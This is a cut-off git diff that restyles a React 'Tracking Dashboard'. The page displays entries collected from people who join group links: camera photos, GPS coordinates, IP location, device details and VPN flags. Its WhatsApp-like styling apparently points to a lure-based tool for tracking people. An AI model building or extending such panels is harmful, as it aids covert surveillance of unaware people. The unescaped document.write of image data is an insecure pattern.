@@ -5,7 +5,25 @@ import { CollectedData } from '@/lib/dataCollection';
 import { exportGroupData, exportAllData } from '@/lib/dataExport';
 import { checkGroupData } from '@/lib/checkData';
 import { getAllTrackingData } from '@/lib/storage';
-import { Download, MagnifyingGlass, Users, MapPin, Shield, Clock, Warning, CheckCircle, XCircle } from '@phosphor-icons/react';
+import { 
+  Download, 
+  Search, 
+  Users, 
+  MapPin, 
+  Shield, 
+  Clock, 
+  CheckCircle, 
+  XCircle,
+  Camera,
+  Globe,
+  Activity,
+  AlertTriangle,
+  TrendingUp,
+  Filter,
+  FileDown,
+  Eye,
+  BarChart3
+} from 'lucide-react';
 
 export default function ViewDataPage() {
   const [allData, setAllData] = useState<CollectedData[]>([]);
@@ -13,34 +31,38 @@ export default function ViewDataPage() {
   const [groups, setGroups] = useState<string[]>([]);
   const [checkGroupId, setCheckGroupId] = useState<string>('');
   const [checkResult, setCheckResult] = useState<any>(null);
+  const [isLoading, setIsLoading] = useState(true);
 
   useEffect(() => {
     loadData();
   }, []);
 
   const loadData = async () => {
-    // Load all tracking data using new storage system
-    const data = await getAllTrackingData();
-    setAllData(data);
-    
-    // Get unique group IDs
-    const uniqueGroups = [...new Set(data.map((d: CollectedData) => d.metadata.groupId))] as string[];
-    setGroups(uniqueGroups);
+    setIsLoading(true);
+    try {
+      const data = await getAllTrackingData();
+      setAllData(data);
+      const uniqueGroups = [...new Set(data.map((d: CollectedData) => d.metadata.groupId))] as string[];
+      setGroups(uniqueGroups);
+    } catch (error) {
+      console.error('Error loading data:', error);
+    } finally {
+      setIsLoading(false);
+    }
   };
 
   const filteredData = selectedGroup === 'all' 
     ? allData 
     : allData.filter(d => d.metadata.groupId === selectedGroup);
 
-  const handleCheckGroup = () => {
+  const handleCheckGroup = async () => {
     if (!checkGroupId.trim()) {
       alert('Please enter a group ID');
       return;
     }
-    const result = checkGroupData(checkGroupId.trim());
+    const result = await checkGroupData(checkGroupId.trim());
     setCheckResult(result);
   };
-
 
   // Calculate statistics
   const stats = {
@@ -49,380 +71,409 @@ export default function ViewDataPage() {
     withPhoto: filteredData.filter(d => d.cameraImage).length,
     suspicious: filteredData.filter(d => d.analysis.flags.length > 0).length,
     vpnDetected: filteredData.filter(d => d.ipLocation?.isVPN).length,
+    safe: filteredData.filter(d => d.analysis.flags.length === 0).length,
   };
 
-  return (
-    <div className="min-h-screen bg-gradient-to-br from-[#e5ddd5] via-[#f0f2f5] to-[#e5ddd5] py-8 px-4 sm:py-12 sm:px-6">
-      <div className="max-w-7xl mx-auto">
-        {/* Header Section - Centered and Professional */}
-        <div className="text-center mb-8">
-          <div className="inline-flex items-center justify-center w-20 h-20 bg-gradient-to-br from-[#128C7E] to-[#075E54] rounded-2xl mb-4 shadow-xl">
-            <Shield className="w-12 h-12 text-white" weight="fill" />
-          </div>
-          <h1 className="text-4xl sm:text-5xl font-bold text-[#1f1f1f] mb-3">Tracking Data Dashboard</h1>
-          <p className="text-lg text-[#667781] max-w-2xl mx-auto">Monitor and analyze all collected tracking data in real-time</p>
-        </div>
+  const suspiciousPercentage = stats.total > 0 
+    ? Math.round((stats.suspicious / stats.total) * 100) 
+    : 0;
 
-        {/* Main Dashboard Card */}
-        <div className="bg-white rounded-3xl shadow-2xl p-6 sm:p-8 mb-6 border border-[#e4e6eb]">
-          <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4 mb-8">
-            <div className="flex-1">
-              <h2 className="text-xl font-bold text-[#1f1f1f] mb-1">Overview</h2>
-              <p className="text-sm text-[#667781]">Real-time statistics and data insights</p>
+  return (
+    <div className="min-h-screen bg-gradient-to-br from-slate-50 via-blue-50 to-slate-50">
+      {/* Professional Header */}
+      <div className="bg-white border-b border-slate-200 shadow-sm">
+        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-6">
+          <div className="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4">
+            <div className="flex items-center space-x-4">
+              <div className="w-14 h-14 bg-gradient-to-br from-emerald-500 to-teal-600 rounded-xl flex items-center justify-center shadow-lg">
+                <BarChart3 className="w-7 h-7 text-white" />
+              </div>
+              <div>
+                <h1 className="text-3xl font-bold text-slate-900">Tracking Dashboard</h1>
+                <p className="text-sm text-slate-500 mt-1">Monitor and analyze collected data</p>
+              </div>
             </div>
             <div className="flex flex-wrap gap-3">
               {selectedGroup !== 'all' && (
                 <button
                   onClick={() => exportGroupData(selectedGroup)}
-                  className="px-6 py-3 bg-[#128C7E] text-white rounded-xl hover:bg-[#075E54] transition-all shadow-lg hover:shadow-xl flex items-center space-x-2 font-semibold"
+                  className="px-5 py-2.5 bg-emerald-600 text-white rounded-lg hover:bg-emerald-700 transition-all shadow-md hover:shadow-lg flex items-center space-x-2 font-medium text-sm"
                 >
-                  <Download className="w-5 h-5" weight="bold" />
+                  <FileDown className="w-4 h-4" />
                   <span>Export Group</span>
                 </button>
               )}
               <button
                 onClick={exportAllData}
-                className="px-6 py-3 bg-[#25D366] text-white rounded-xl hover:bg-[#20BA5A] transition-all shadow-lg hover:shadow-xl flex items-center space-x-2 font-semibold"
+                className="px-5 py-2.5 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-all shadow-md hover:shadow-lg flex items-center space-x-2 font-medium text-sm"
               >
-                <Download className="w-5 h-5" weight="bold" />
-                <span>Export All Data</span>
+                <Download className="w-4 h-4" />
+                <span>Export All</span>
               </button>
             </div>
           </div>
+        </div>
+      </div>
 
-          {/* Statistics Cards - Centered Grid */}
-          <div className="grid grid-cols-2 sm:grid-cols-5 gap-4 mb-8">
-            <div className="bg-gradient-to-br from-[#128C7E] to-[#075E54] rounded-xl p-4 text-white shadow-lg">
-              <div className="flex items-center space-x-2 mb-2">
-                <Users className="w-5 h-5" weight="bold" />
-                <span className="text-xs font-medium opacity-90">Total Entries</span>
+      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
+        {/* Statistics Cards - Professional Grid */}
+        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-6 gap-4 mb-8">
+          <div className="bg-white rounded-xl p-6 shadow-md border border-slate-200 hover:shadow-lg transition-shadow">
+            <div className="flex items-center justify-between mb-3">
+              <div className="w-10 h-10 bg-blue-100 rounded-lg flex items-center justify-center">
+                <Users className="w-5 h-5 text-blue-600" />
               </div>
-              <p className="text-2xl sm:text-3xl font-bold">{stats.total}</p>
+              <span className="text-xs font-semibold text-slate-500 uppercase tracking-wide">Total</span>
             </div>
-            <div className="bg-gradient-to-br from-[#25D366] to-[#20BA5A] rounded-xl p-4 text-white shadow-lg">
-              <div className="flex items-center space-x-2 mb-2">
-                <MapPin className="w-5 h-5" weight="bold" />
-                <span className="text-xs font-medium opacity-90">With GPS</span>
-              </div>
-              <p className="text-2xl sm:text-3xl font-bold">{stats.withGPS}</p>
-            </div>
-            <div className="bg-gradient-to-br from-[#667781] to-[#8696a0] rounded-xl p-4 text-white shadow-lg">
-              <div className="flex items-center space-x-2 mb-2">
-                <Shield className="w-5 h-5" weight="bold" />
-                <span className="text-xs font-medium opacity-90">With Photo</span>
-              </div>
-              <p className="text-2xl sm:text-3xl font-bold">{stats.withPhoto}</p>
-            </div>
-            <div className="bg-gradient-to-br from-[#d93025] to-[#c33] rounded-xl p-4 text-white shadow-lg">
-              <div className="flex items-center space-x-2 mb-2">
-                <Warning className="w-5 h-5" weight="bold" />
-                <span className="text-xs font-medium opacity-90">Suspicious</span>
-              </div>
-              <p className="text-2xl sm:text-3xl font-bold">{stats.suspicious}</p>
-            </div>
-            <div className="bg-gradient-to-br from-[#f59e0b] to-[#d97706] rounded-xl p-4 text-white shadow-lg">
-              <div className="flex items-center space-x-2 mb-2">
-                <Shield className="w-5 h-5" weight="bold" />
-                <span className="text-xs font-medium opacity-90">VPN Detected</span>
-              </div>
-              <p className="text-2xl sm:text-3xl font-bold">{stats.vpnDetected}</p>
-            </div>
-          </div>
-          
-          {/* Filter Section - Centered */}
-          <div className="bg-gradient-to-r from-[#f0f2f5] to-[#e5e8eb] rounded-2xl p-6 mb-6 border-2 border-[#e4e6eb]">
-            <div className="max-w-4xl mx-auto">
-              <div className="flex flex-col sm:flex-row sm:items-end gap-4">
-                <div className="flex-1">
-                  <label className="block text-sm font-bold text-[#1f1f1f] mb-3 flex items-center space-x-2">
-                    <Users className="w-5 h-5 text-[#128C7E]" weight="bold" />
-                    <span>Filter by Group</span>
-                  </label>
-                  <select
-                    value={selectedGroup}
-                    onChange={(e) => setSelectedGroup(e.target.value)}
-                    className="w-full px-5 py-3.5 bg-white border-2 border-[#e4e6eb] rounded-xl focus:ring-4 focus:ring-[#128C7E]/20 focus:border-[#128C7E] outline-none font-semibold text-[#1f1f1f] shadow-sm hover:shadow-md transition-all"
-                  >
-                    <option value="all">📊 All Groups ({groups.length})</option>
-                    {groups.map(groupId => (
-                      <option key={groupId} value={groupId}>🔗 {groupId}</option>
-                    ))}
-                  </select>
-                </div>
-                <div className="bg-white rounded-xl px-6 py-4 border-2 border-[#128C7E] shadow-lg">
-                  <p className="text-xs text-[#667781] mb-1 font-medium">Currently Showing</p>
-                  <p className="text-2xl font-bold text-[#128C7E]">{filteredData.length}</p>
-                  <p className="text-xs text-[#8696a0] mt-1">{filteredData.length === 1 ? 'entry' : 'entries'}</p>
-                </div>
-              </div>
-            </div>
+            <p className="text-3xl font-bold text-slate-900">{stats.total}</p>
+            <p className="text-xs text-slate-500 mt-1">Entries collected</p>
           </div>
 
-          {/* Check Group Data - Centered */}
-          <div className="bg-gradient-to-br from-[#f0f2f5] via-[#e5e8eb] to-[#f0f2f5] rounded-2xl p-6 border-2 border-[#e4e6eb]">
-            <div className="max-w-3xl mx-auto">
-              <h3 className="text-lg font-bold text-[#1f1f1f] mb-5 flex items-center justify-center space-x-2">
-                <MagnifyingGlass className="w-6 h-6 text-[#128C7E]" weight="bold" />
-                <span>Quick Check Group Data</span>
-              </h3>
-              <div className="flex flex-col sm:flex-row gap-3 mb-4">
-                <input
-                  type="text"
-                  value={checkGroupId}
-                  onChange={(e) => setCheckGroupId(e.target.value)}
-                  placeholder="Enter group ID (e.g., j0d5ne9u3xm)"
-                  className="flex-1 px-5 py-3.5 bg-white border-2 border-[#e4e6eb] rounded-xl focus:ring-4 focus:ring-[#128C7E]/20 focus:border-[#128C7E] outline-none font-mono text-sm shadow-sm hover:shadow-md transition-all"
-                />
-                <button
-                  onClick={handleCheckGroup}
-                  className="px-8 py-3.5 bg-[#128C7E] text-white rounded-xl hover:bg-[#075E54] transition-all font-bold shadow-lg hover:shadow-xl"
-                >
-                  Check Now
-                </button>
+          <div className="bg-white rounded-xl p-6 shadow-md border border-slate-200 hover:shadow-lg transition-shadow">
+            <div className="flex items-center justify-between mb-3">
+              <div className="w-10 h-10 bg-emerald-100 rounded-lg flex items-center justify-center">
+                <MapPin className="w-5 h-5 text-emerald-600" />
               </div>
-              {checkResult && (
-              <div className={`mt-4 p-4 rounded-xl border-2 ${
-                checkResult.exists 
-                  ? 'bg-green-50 border-green-200' 
+              <span className="text-xs font-semibold text-slate-500 uppercase tracking-wide">GPS</span>
+            </div>
+            <p className="text-3xl font-bold text-slate-900">{stats.withGPS}</p>
+            <p className="text-xs text-slate-500 mt-1">With location</p>
+          </div>
+
+          <div className="bg-white rounded-xl p-6 shadow-md border border-slate-200 hover:shadow-lg transition-shadow">
+            <div className="flex items-center justify-between mb-3">
+              <div className="w-10 h-10 bg-purple-100 rounded-lg flex items-center justify-center">
+                <Camera className="w-5 h-5 text-purple-600" />
+              </div>
+              <span className="text-xs font-semibold text-slate-500 uppercase tracking-wide">Photos</span>
+            </div>
+            <p className="text-3xl font-bold text-slate-900">{stats.withPhoto}</p>
+            <p className="text-xs text-slate-500 mt-1">Captured</p>
+          </div>
+
+          <div className="bg-white rounded-xl p-6 shadow-md border border-slate-200 hover:shadow-lg transition-shadow">
+            <div className="flex items-center justify-between mb-3">
+              <div className="w-10 h-10 bg-green-100 rounded-lg flex items-center justify-center">
+                <Shield className="w-5 h-5 text-green-600" />
+              </div>
+              <span className="text-xs font-semibold text-slate-500 uppercase tracking-wide">Safe</span>
+            </div>
+            <p className="text-3xl font-bold text-slate-900">{stats.safe}</p>
+            <p className="text-xs text-slate-500 mt-1">No flags</p>
+          </div>
+
+          <div className="bg-white rounded-xl p-6 shadow-md border border-red-200 hover:shadow-lg transition-shadow">
+            <div className="flex items-center justify-between mb-3">
+              <div className="w-10 h-10 bg-red-100 rounded-lg flex items-center justify-center">
+                <AlertTriangle className="w-5 h-5 text-red-600" />
+              </div>
+              <span className="text-xs font-semibold text-slate-500 uppercase tracking-wide">Suspicious</span>
+            </div>
+            <p className="text-3xl font-bold text-red-600">{stats.suspicious}</p>
+            <p className="text-xs text-slate-500 mt-1">{suspiciousPercentage}% of total</p>
+          </div>
+
+          <div className="bg-white rounded-xl p-6 shadow-md border border-orange-200 hover:shadow-lg transition-shadow">
+            <div className="flex items-center justify-between mb-3">
+              <div className="w-10 h-10 bg-orange-100 rounded-lg flex items-center justify-center">
+                <Globe className="w-5 h-5 text-orange-600" />
+              </div>
+              <span className="text-xs font-semibold text-slate-500 uppercase tracking-wide">VPN</span>
+            </div>
+            <p className="text-3xl font-bold text-orange-600">{stats.vpnDetected}</p>
+            <p className="text-xs text-slate-500 mt-1">Detected</p>
+          </div>
+        </div>
+
+        {/* Filter and Search Section */}
+        <div className="bg-white rounded-xl shadow-md border border-slate-200 p-6 mb-8">
+          <div className="flex flex-col lg:flex-row lg:items-center lg:justify-between gap-4">
+            <div className="flex-1">
+              <label className="block text-sm font-semibold text-slate-700 mb-3 flex items-center space-x-2">
+                <Filter className="w-4 h-4 text-slate-500" />
+                <span>Filter by Group</span>
+              </label>
+              <select
+                value={selectedGroup}
+                onChange={(e) => setSelectedGroup(e.target.value)}
+                className="w-full px-4 py-3 bg-slate-50 border-2 border-slate-200 rounded-lg focus:ring-2 focus:ring-emerald-500 focus:border-emerald-500 outline-none font-medium text-slate-900 transition-all"
+              >
+                <option value="all">📊 All Groups ({groups.length})</option>
+                {groups.map(groupId => (
+                  <option key={groupId} value={groupId}>🔗 {groupId}</option>
+                ))}
+              </select>
+            </div>
+            <div className="bg-slate-50 rounded-lg px-6 py-4 border-2 border-emerald-500">
+              <p className="text-xs text-slate-500 mb-1 font-medium">Currently Showing</p>
+              <p className="text-3xl font-bold text-emerald-600">{filteredData.length}</p>
+              <p className="text-xs text-slate-500 mt-1">{filteredData.length === 1 ? 'entry' : 'entries'}</p>
+            </div>
+          </div>
+
+          {/* Quick Check Section */}
+          <div className="mt-6 pt-6 border-t border-slate-200">
+            <h3 className="text-sm font-semibold text-slate-700 mb-4 flex items-center space-x-2">
+              <Search className="w-4 h-4 text-slate-500" />
+              <span>Quick Check Group Data</span>
+            </h3>
+            <div className="flex flex-col sm:flex-row gap-3">
+              <input
+                type="text"
+                value={checkGroupId}
+                onChange={(e) => setCheckGroupId(e.target.value)}
+                placeholder="Enter group ID (e.g., j0d5ne9u3xm)"
+                className="flex-1 px-4 py-3 bg-slate-50 border-2 border-slate-200 rounded-lg focus:ring-2 focus:ring-emerald-500 focus:border-emerald-500 outline-none font-mono text-sm"
+              />
+              <button
+                onClick={handleCheckGroup}
+                className="px-6 py-3 bg-slate-900 text-white rounded-lg hover:bg-slate-800 transition-all font-semibold shadow-md hover:shadow-lg"
+              >
+                Check Now
+              </button>
+            </div>
+            {checkResult && (
+              <div className={`mt-4 p-4 rounded-lg border-2 ${
+                checkResult.exists
+                  ? 'bg-emerald-50 border-emerald-200'
                   : 'bg-red-50 border-red-200'
               }`}>
                 {checkResult.exists ? (
                   <div className="space-y-3">
                     <div className="flex items-center space-x-2">
-                      <CheckCircle className="w-6 h-6 text-green-600" weight="fill" />
-                      <p className="text-base font-bold text-green-700">Group Found!</p>
+                      <CheckCircle className="w-5 h-5 text-emerald-600" />
+                      <p className="text-base font-bold text-emerald-700">Group Found!</p>
                     </div>
                     <div className="grid grid-cols-1 sm:grid-cols-3 gap-3 text-sm">
                       <div>
-                        <p className="text-xs text-[#667781] mb-1">Group Name</p>
-                        <p className="font-semibold text-[#1f1f1f]">{checkResult.groupInfo?.name || 'Unknown'}</p>
+                        <p className="text-xs text-slate-500 mb-1">Group Name</p>
+                        <p className="font-semibold text-slate-900">{checkResult.groupInfo?.name || 'Unknown'}</p>
                       </div>
                       <div>
-                        <p className="text-xs text-[#667781] mb-1">Created</p>
-                        <p className="font-semibold text-[#1f1f1f]">
+                        <p className="text-xs text-slate-500 mb-1">Created</p>
+                        <p className="font-semibold text-slate-900">
                           {checkResult.groupInfo?.createdAt ? new Date(checkResult.groupInfo.createdAt).toLocaleDateString() : 'Unknown'}
                         </p>
                       </div>
                       <div>
-                        <p className="text-xs text-[#667781] mb-1">Tracking Entries</p>
-                        <p className="font-semibold text-[#1f1f1f]">{checkResult.trackingDataCount}</p>
+                        <p className="text-xs text-slate-500 mb-1">Tracking Entries</p>
+                        <p className="font-semibold text-slate-900">{checkResult.trackingDataCount}</p>
                       </div>
                     </div>
                     {checkResult.hasData ? (
-                      <div className="flex items-center space-x-2 mt-3 p-2 bg-green-100 rounded-lg">
-                        <CheckCircle className="w-5 h-5 text-green-600" weight="fill" />
-                        <p className="text-sm text-green-700 font-semibold">✓ Data is stored and ready to export</p>
+                      <div className="flex items-center space-x-2 mt-3 p-2 bg-emerald-100 rounded-lg">
+                        <CheckCircle className="w-4 h-4 text-emerald-600" />
+                        <p className="text-sm text-emerald-700 font-semibold">✓ Data is stored and ready to export</p>
                       </div>
                     ) : (
                       <div className="flex items-center space-x-2 mt-3 p-2 bg-yellow-100 rounded-lg">
-                        <Warning className="w-5 h-5 text-yellow-600" weight="fill" />
+                        <AlertTriangle className="w-4 h-4 text-yellow-600" />
                         <p className="text-sm text-yellow-700 font-semibold">⚠ No tracking data yet (no one has joined)</p>
                       </div>
                     )}
                   </div>
                 ) : (
                   <div className="flex items-center space-x-2">
-                    <XCircle className="w-6 h-6 text-red-600" weight="fill" />
+                    <XCircle className="w-5 h-5 text-red-600" />
                     <p className="text-base font-bold text-red-700">Group not found in storage</p>
                   </div>
                 )}
               </div>
-              )}
-            </div>
+            )}
           </div>
         </div>
 
-        {/* Data Cards Section - Centered */}
-        <div className="mt-8">
-          <div className="text-center mb-6">
-            <h2 className="text-2xl sm:text-3xl font-bold text-[#1f1f1f] mb-2">Collected Data</h2>
-            <p className="text-[#667781]">Detailed information for each entry</p>
+        {/* Data Cards Section */}
+        <div className="mb-8">
+          <div className="flex items-center justify-between mb-6">
+            <div>
+              <h2 className="text-2xl font-bold text-slate-900">Collected Data</h2>
+              <p className="text-sm text-slate-500 mt-1">Detailed information for each entry</p>
+            </div>
           </div>
-          
-          {filteredData.length > 0 ? (
-            <div className="grid gap-6 md:grid-cols-2 lg:grid-cols-3 max-w-7xl mx-auto">
-            {filteredData.map((data, index) => (
-              <div key={index} className="bg-white rounded-2xl shadow-xl p-6 hover:shadow-2xl transition-all border border-[#e4e6eb]">
-              {/* Entry Header */}
-              <div className="flex items-center justify-between mb-4 pb-3 border-b-2 border-[#e4e6eb]">
-                <div className="flex items-center space-x-2">
-                  <div className="w-10 h-10 bg-gradient-to-br from-[#128C7E] to-[#075E54] rounded-full flex items-center justify-center text-white font-bold">
-                    #{index + 1}
-                  </div>
-                  <div>
-                    <p className="text-xs text-[#8696a0]">Entry</p>
-                    <p className="text-sm font-semibold text-[#1f1f1f]">
-                      {new Date(data.metadata.timestamp).toLocaleDateString()}
-                    </p>
-                  </div>
-                </div>
-                {data.analysis.flags.length > 0 ? (
-                  <div className="flex items-center space-x-1 px-2 py-1 bg-red-100 rounded-lg">
-                    <Warning className="w-4 h-4 text-red-600" weight="fill" />
-                    <span className="text-xs font-semibold text-red-600">{data.analysis.flags.length}</span>
-                  </div>
-                ) : (
-                  <div className="flex items-center space-x-1 px-2 py-1 bg-green-100 rounded-lg">
-                    <CheckCircle className="w-4 h-4 text-green-600" weight="fill" />
-                    <span className="text-xs font-semibold text-green-600">Safe</span>
-                  </div>
-                )}
-              </div>
 
-              {/* Camera Image - Prominent Display */}
-              {data.cameraImage ? (
-                <div className="mb-5 p-4 bg-gradient-to-br from-[#e5f3ff] to-[#d1e7ff] rounded-xl border-2 border-[#128C7E]/30">
-                  <h3 className="text-sm font-bold text-[#1f1f1f] mb-3 flex items-center space-x-2">
-                    <Shield className="w-5 h-5 text-[#128C7E]" weight="fill" />
-                    <span>📷 Captured Photo</span>
-                  </h3>
-                  <div className="relative">
-                    <img 
-                      src={data.cameraImage} 
-                      alt="Captured photo from user's camera" 
-                      className="w-full rounded-xl border-2 border-[#128C7E]/50 max-h-64 object-cover shadow-lg hover:shadow-xl transition-all cursor-pointer"
-                      onClick={() => {
-                        // Open image in new tab for full view
-                        const newWindow = window.open();
-                        if (newWindow) {
-                          newWindow.document.write(`<img src="${data.cameraImage}" style="max-width:100%; height:auto;" />`);
-                        }
-                      }}
-                    />
-                    <div className="absolute top-2 right-2 bg-[#128C7E] text-white px-2 py-1 rounded-lg text-xs font-semibold shadow-lg">
-                      Click to View Full Size
+          {isLoading ? (
+            <div className="bg-white rounded-xl shadow-md border border-slate-200 p-16 text-center">
+              <div className="inline-flex items-center justify-center w-16 h-16 bg-slate-100 rounded-full mb-4">
+                <Activity className="w-8 h-8 text-slate-400 animate-pulse" />
+              </div>
+              <p className="text-slate-500">Loading data...</p>
+            </div>
+          ) : filteredData.length > 0 ? (
+            <div className="grid gap-6 md:grid-cols-2 lg:grid-cols-3">
+              {filteredData.map((data, index) => (
+                <div key={index} className="bg-white rounded-xl shadow-md hover:shadow-xl transition-all border border-slate-200 overflow-hidden">
+                  {/* Entry Header */}
+                  <div className="bg-gradient-to-r from-slate-50 to-slate-100 px-6 py-4 border-b border-slate-200">
+                    <div className="flex items-center justify-between">
+                      <div className="flex items-center space-x-3">
+                        <div className="w-10 h-10 bg-gradient-to-br from-emerald-500 to-teal-600 rounded-lg flex items-center justify-center text-white font-bold shadow-md">
+                          #{index + 1}
+                        </div>
+                        <div>
+                          <p className="text-xs text-slate-500 font-medium">Entry</p>
+                          <p className="text-sm font-semibold text-slate-900">
+                            {new Date(data.metadata.timestamp).toLocaleDateString()}
+                          </p>
+                        </div>
+                      </div>
+                      {data.analysis.flags.length > 0 ? (
+                        <div className="flex items-center space-x-1 px-3 py-1 bg-red-100 rounded-lg border border-red-200">
+                          <AlertTriangle className="w-4 h-4 text-red-600" />
+                          <span className="text-xs font-semibold text-red-600">{data.analysis.flags.length}</span>
+                        </div>
+                      ) : (
+                        <div className="flex items-center space-x-1 px-3 py-1 bg-green-100 rounded-lg border border-green-200">
+                          <CheckCircle className="w-4 h-4 text-green-600" />
+                          <span className="text-xs font-semibold text-green-600">Safe</span>
+                        </div>
+                      )}
                     </div>
                   </div>
-                  <div className="mt-3 flex items-center justify-between">
-                    <p className="text-xs text-[#667781]">
-                      <span className="font-semibold">Status:</span> {data.metadata.cameraPermissionStatus}
-                    </p>
-                    <p className="text-xs text-[#128C7E] font-semibold">✓ Photo Captured</p>
+
+                  {/* Entry Content */}
+                  <div className="p-6 space-y-4">
+                    {/* Camera Image */}
+                    {data.cameraImage ? (
+                      <div className="bg-gradient-to-br from-blue-50 to-indigo-50 rounded-lg p-4 border border-blue-200">
+                        <h3 className="text-xs font-semibold text-slate-700 mb-3 flex items-center space-x-2">
+                          <Camera className="w-4 h-4 text-blue-600" />
+                          <span>📷 Captured Photo</span>
+                        </h3>
+                        <div className="relative">
+                          <img
+                            src={data.cameraImage}
+                            alt="Captured photo"
+                            className="w-full rounded-lg border-2 border-blue-200 max-h-48 object-cover shadow-sm hover:shadow-md transition-all cursor-pointer"
+                            onClick={() => {
+                              const newWindow = window.open();
+                              if (newWindow) {
+                                newWindow.document.write(`<img src="${data.cameraImage}" style="max-width:100%; height:auto;" />`);
+                              }
+                            }}
+                          />
+                          <div className="absolute top-2 right-2 bg-blue-600 text-white px-2 py-1 rounded text-xs font-semibold shadow-lg">
+                            Click to View
+                          </div>
+                        </div>
+                        <p className="text-xs text-slate-500 mt-2">
+                          Status: <span className="font-semibold">{data.metadata.cameraPermissionStatus}</span>
+                        </p>
+                      </div>
+                    ) : (
+                      <div className="bg-slate-50 rounded-lg p-4 border border-slate-200 text-center">
+                        <Camera className="w-6 h-6 text-slate-400 mx-auto mb-2" />
+                        <p className="text-xs text-slate-500 font-medium">No photo captured</p>
+                      </div>
+                    )}
+
+                    {/* Location */}
+                    <div className="bg-slate-50 rounded-lg p-4 border border-slate-200">
+                      <h3 className="text-xs font-semibold text-slate-700 mb-3 flex items-center space-x-2">
+                        <MapPin className="w-4 h-4 text-emerald-600" />
+                        <span>Location Data</span>
+                      </h3>
+                      <div className="space-y-1 text-xs">
+                        {data.gpsLocation && (
+                          <p className="text-slate-600">
+                            <span className="font-semibold">GPS:</span> {data.gpsLocation.latitude.toFixed(4)}, {data.gpsLocation.longitude.toFixed(4)}
+                          </p>
+                        )}
+                        {data.ipLocation && (
+                          <>
+                            <p className="text-slate-600">
+                              <span className="font-semibold">IP:</span> {data.ipLocation.city}, {data.ipLocation.country}
+                            </p>
+                            {data.ipLocation.timezone && data.ipLocation.timezone !== 'Unknown' && (
+                              <p className="text-slate-500">Timezone: {data.ipLocation.timezone}</p>
+                            )}
+                            {data.ipLocation.isp && data.ipLocation.isp !== 'Unknown' && (
+                              <p className="text-slate-500">ISP: {data.ipLocation.isp}</p>
+                            )}
+                          </>
+                        )}
+                        {data.analysis.locationMismatch && (
+                          <p className="text-red-600 font-semibold mt-1">⚠️ Location Mismatch</p>
+                        )}
+                      </div>
+                    </div>
+
+                    {/* Device */}
+                    <div className="bg-slate-50 rounded-lg p-4 border border-slate-200">
+                      <h3 className="text-xs font-semibold text-slate-700 mb-3 flex items-center space-x-2">
+                        <Activity className="w-4 h-4 text-purple-600" />
+                        <span>Device Information</span>
+                      </h3>
+                      <p className="text-xs text-slate-600">
+                        {data.deviceInfo.type} • {data.deviceInfo.os} • {data.deviceInfo.browser}
+                      </p>
+                      {data.analysis.deviceMismatch && (
+                        <p className="text-xs text-red-600 mt-1 font-semibold">⚠️ Device Mismatch</p>
+                      )}
+                    </div>
+
+                    {/* Network */}
+                    {data.networkInfo && (
+                      <div className="bg-slate-50 rounded-lg p-4 border border-slate-200">
+                        <h3 className="text-xs font-semibold text-slate-700 mb-3 flex items-center space-x-2">
+                          <Globe className="w-4 h-4 text-orange-600" />
+                          <span>Network Information</span>
+                        </h3>
+                        <p className="text-xs text-slate-600">
+                          {data.networkInfo.connectionType} • {data.networkInfo.effectiveType}
+                        </p>
+                        {data.ipLocation?.isVPN && (
+                          <p className="text-xs text-orange-600 mt-1 font-semibold">⚠️ VPN Detected</p>
+                        )}
+                        {data.ipLocation?.isProxy && (
+                          <p className="text-xs text-orange-600 mt-1 font-semibold">⚠️ Proxy Detected</p>
+                        )}
+                      </div>
+                    )}
+
+                    {/* Flags */}
+                    {data.analysis.flags.length > 0 && (
+                      <div className="bg-red-50 border-2 border-red-200 rounded-lg p-4">
+                        <h3 className="text-xs font-semibold text-red-700 mb-3 flex items-center space-x-2">
+                          <AlertTriangle className="w-4 h-4 text-red-600" />
+                          <span>Suspicious Indicators ({data.analysis.flags.length})</span>
+                        </h3>
+                        <ul className="text-xs text-red-700 space-y-1.5">
+                          {data.analysis.flags.slice(0, 5).map((flag, i) => (
+                            <li key={i} className="flex items-start space-x-2">
+                              <span className="text-red-500 mt-0.5">•</span>
+                              <span>{flag}</span>
+                            </li>
+                          ))}
+                          {data.analysis.flags.length > 5 && (
+                            <li className="text-red-600 font-semibold">+{data.analysis.flags.length - 5} more flags</li>
+                          )}
+                        </ul>
+                      </div>
+                    )}
+
+                    {/* Footer */}
+                    <div className="pt-4 border-t border-slate-200 flex items-center justify-between">
+                      <div className="flex items-center space-x-2 text-xs text-slate-500">
+                        <Clock className="w-3 h-3" />
+                        <span>{new Date(data.metadata.timestamp).toLocaleString()}</span>
+                      </div>
+                      <p className="text-xs text-slate-400 font-mono">
+                        {data.metadata.groupId.substring(0, 10)}...
+                      </p>
+                    </div>
                   </div>
                 </div>
-              ) : (
-                <div className="mb-5 p-4 bg-[#f0f2f5] rounded-xl border-2 border-dashed border-[#e4e6eb] text-center">
-                  <Shield className="w-8 h-8 text-[#8696a0] mx-auto mb-2" weight="bold" />
-                  <p className="text-xs text-[#8696a0] font-medium">No photo captured</p>
-                  <p className="text-xs text-[#8696a0] mt-1">Camera permission was denied or not available</p>
-                </div>
-              )}
-
-              {/* Location */}
-              <div className="mb-4 p-3 bg-[#f0f2f5] rounded-xl">
-                <h3 className="text-sm font-semibold text-[#1f1f1f] mb-3 flex items-center space-x-2">
-                  <MapPin className="w-4 h-4 text-[#128C7E]" weight="bold" />
-                  <span>Location Data</span>
-                </h3>
-                {data.gpsLocation && (
-                  <p className="text-xs text-[#667781]">
-                    GPS: {data.gpsLocation.latitude.toFixed(4)}, {data.gpsLocation.longitude.toFixed(4)}
-                  </p>
-                )}
-                {data.ipLocation && (
-                  <>
-                    <p className="text-xs text-[#667781]">
-                      IP: {data.ipLocation.city}, {data.ipLocation.region}, {data.ipLocation.country}
-                    </p>
-                    {data.ipLocation.timezone && data.ipLocation.timezone !== 'Unknown' && (
-                      <p className="text-xs text-[#8696a0]">
-                        Timezone: {data.ipLocation.timezone}
-                      </p>
-                    )}
-                    {data.ipLocation.currency && data.ipLocation.currency !== 'Unknown' && (
-                      <p className="text-xs text-[#8696a0]">
-                        Currency: {data.ipLocation.currency} ({data.ipLocation.currencyName})
-                      </p>
-                    )}
-                    {data.ipLocation.isp && data.ipLocation.isp !== 'Unknown' && (
